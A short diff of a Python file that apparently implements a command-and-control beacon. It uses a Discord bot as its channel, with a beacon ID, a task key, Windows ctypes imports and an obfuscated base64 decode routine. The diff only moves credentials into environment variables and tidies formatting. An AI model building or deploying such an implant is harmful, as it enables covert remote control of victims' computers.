@@ -1,5 +1,6 @@
 import discord
 import sys
+import os
 import base64
 import urllib
 from time import sleep
@@ -7,9 +8,10 @@ from ctypes import *
 from ctypes.wintypes import *
 import uuid
 
+
 # Discord bot token
-DISCORD_TOKEN = 'YOUR_DISCORD_BOT_TOKEN'
-CHANNEL_ID = 123456789012345678  # Replace with your Discord channel ID
+DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')
+CHANNEL_ID = os.getenv('COMMAND_CHANNEL_ID')
 
 beaconId = str(uuid.uuid4())
 taskKeyName = beaconId + ':TaskForYou'
@@ -30,9 +32,9 @@ def decode(data):
     data = urllib.parse.unquote(data[::-1])
     return base64.b64decode(data)
 
-#####################
+#######################
 # Transport functions #
-#####################
+#######################
 
 async def prepTransport():
     await client.wait_until_ready()
